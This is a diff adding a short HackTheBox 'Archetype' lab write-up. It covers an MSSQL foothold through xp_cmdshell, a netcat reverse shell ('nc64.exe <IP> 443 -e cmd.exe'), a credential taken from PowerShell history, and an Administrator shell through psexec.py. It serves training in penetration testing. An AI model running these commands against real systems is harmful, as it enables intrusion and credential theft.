@@ -1,0 +1,53 @@
+# ARCHETYPE - HackTheBox Starting Point
+
+## Scan
+- Ran Nmap against the target.
+- Found port **1433/tcp** open.
+- Service identified: **Microsoft SQL Server**.
+
+## Access
+- Connected to SQL Server using credentials provided in the Starting Point.
+- Enabled `xp_cmdshell` to execute system commands.
+- Uploaded `nc64.exe` via HTTP server and executed:
+EXEC xp_cmdshell 'C:\Users\sql_svc\Downloads\nc64.exe <IP> 443 -e cmd.exe';
+- Reverse shell established as user `archetype\sql_svc`.
+
+## User Flag
+- Navigated to the user’s Desktop:
+cd C:\Users\sql_svc\Desktop
+dir
+type user.txt
+- Retrieved the **user flag**.
+
+## Enumeration
+- The module suggests running **winPEAS** to enumerate privileges and misconfigurations.
+- Instead, directly inspected PowerShell history:
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+- Found administrator credentials in plain text:
+Administrator : MEGACORP_4dm1n!!
+
+## Privilege Escalation
+- Opened a new tab in Parrot (separate from SQL tab, listener tab, and HTTP tab).
+- Used Impacket’s `psexec.py` to connect as Administrator:
+python3 psexec.py administrator@<IP>
+- Entered the password `MEGACORP_4dm1n!!`.
+- Gained shell as **Administrator**.
+
+## Root Flag
+- Navigated to Administrator’s Desktop:
+cd C:\Users\Administrator\Desktop
+dir
+type root.txt
+- Retrieved the **root flag**.
+
+## Lessons Learned
+- SQL Server with `xp_cmdshell` enabled allows remote command execution.
+- Reverse shells can be established with simple tools like Netcat.
+- Sensitive information often resides in PowerShell history (`ConsoleHost_history.txt`).
+- Using Impacket (`psexec.py`) is a reliable way to escalate privileges once credentials are found.
+- Always avoid storing plaintext credentials in command history.
+- Separate tabs are used to keep processes organized:
+- **SQL tab:** ejecutar payloads.
+- **Listener tab:** recibir la shell.
+- **HTTP tab:** servir binarios.
+- **Nuevo tab:** escalar con `psexec.py`.
